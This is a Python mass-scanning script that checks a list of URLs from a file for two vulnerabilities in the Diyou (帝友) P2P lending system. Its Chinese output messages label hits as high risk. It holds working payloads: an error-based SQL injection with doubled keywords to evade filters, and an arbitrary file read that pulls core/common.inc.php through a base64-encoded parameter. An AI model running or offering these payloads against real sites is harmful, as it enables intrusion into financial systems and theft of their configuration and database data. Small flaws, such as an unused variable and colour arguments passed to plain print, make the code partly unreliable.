
import json
import requests

urls = open('url.txt')

poc = '/action/usermanager.htm'

for i in urls:
    url = i.rstrip("\n")
    payload = "/lates/index.html?username=123%27/**/and/**/(seleselectct/**/1/**/from/**/(selselectect/**/count(*),concat(0x7e,MD5(%271234%27),0x7e,floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)%23"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, timeout=10, verify=False)

        if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
            print("[+]存在帝友P2P借贷系统 SQL注入漏洞...(高危)\tpayload: " + vulnurl, "red")
        else:
            print("[-]不存在dyp2p_latesindex_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    payload = "/index.php?plugins&q=imgurl&url=QGltZ3VybEAvY29yZS9jb21tb24uaW5jLnBocA=="
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, timeout=10, verify=False)

        if r"common.inc.php" in req.text:
            print("[+]存在帝友P2P借贷系统任意文件读取漏洞...(高危)\tpayload: " + vulnurl, "red")
        else:
            print("[-]不存在dyp2p_url_fileread漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")